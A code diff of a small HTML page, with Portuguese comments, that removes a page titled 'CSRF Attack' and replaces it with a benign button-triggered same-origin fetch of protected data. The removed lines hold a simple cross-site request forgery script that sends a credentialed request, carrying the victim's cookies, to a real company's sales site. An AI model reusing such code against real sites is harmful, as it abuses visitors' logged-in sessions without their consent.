@@ -1,22 +1,26 @@
+
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CSRF Attack</title>
+    <title>Exemplo de Acesso a Dados Protegidos</title>
 </head>
 <body>
-    <h1>CSRF Attack</h1>
+    <h1>Dados Protegidos</h1>
+    <button id="fetch-data">Buscar Dados</button>
+    <pre id="data"></pre>
+
     <script>
-        // Tenta fazer uma requisição GET para o endpoint do site alvo
-        fetch('https://sales.apple.com/home', {
-            method: 'GET',
-            credentials: 'include' // Inclui cookies da vítima
-        }).then(response => {
-            // Processa a resposta; no entanto, a resposta geralmente não estará acessível
-            response.text().then(text => {
-                // Aqui você só pode exibir a resposta no console da vítima
-                console.log(text);
-            }).catch(error => console.error('Erro ao processar resposta:', error));
-        }).catch(error => console.error('Erro ao fazer requisição:', error));
+        document.getElementById('fetch-data').addEventListener('click', () => {
+            fetch('/api/protected-data', {
+                method: 'GET',
+                credentials: 'include' // Inclui cookies com a requisição
+            })
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('data').textContent = JSON.stringify(data, null, 2);
+            })
+            .catch(error => console.error('Erro ao buscar dados:', error));
+        });
     </script>
 </body>
 </html>
